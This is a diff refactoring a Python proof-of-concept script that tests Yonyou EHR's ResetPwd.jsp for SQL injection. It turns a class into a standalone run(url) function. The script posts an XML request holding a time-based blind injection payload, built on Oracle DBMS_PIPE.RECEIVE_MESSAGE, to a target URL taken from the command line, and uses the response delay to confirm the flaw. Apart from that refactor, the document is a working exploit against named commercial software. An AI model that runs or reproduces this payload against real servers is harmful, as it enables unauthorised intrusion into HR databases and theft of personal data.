@@ -11,14 +11,7 @@ import time
 import json
 import requests
 import warnings
-
-
-
-class ehr_resetpwd_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['用友EHR系统 ResetPwd.jsp SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -30,7 +23,7 @@ class ehr_resetpwd_sqli:
             "__xml":'''<rpc method="resetPwd" transaction="10"><def><dataset id="dsResetPwd" type="Custom"><f name="user"></f></dataset></def><data><rs dataset="dsResetPwd"><r state="insert" id="10008"><n><v>aaa'AnD 4821=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(65)||CHR(122)||CHR(82),6)AnD'kOkV'='kOkV</v></n></r></rs></data><vps><p type="0" name="__profileKeys">findPwd%3B9589d8b622333776899b3ff0567f4603</p></vps></rpc>''', 
             "1480658911300":""
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         start_time = time.time()
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
@@ -47,5 +40,5 @@ class ehr_resetpwd_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ehr_resetpwd_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
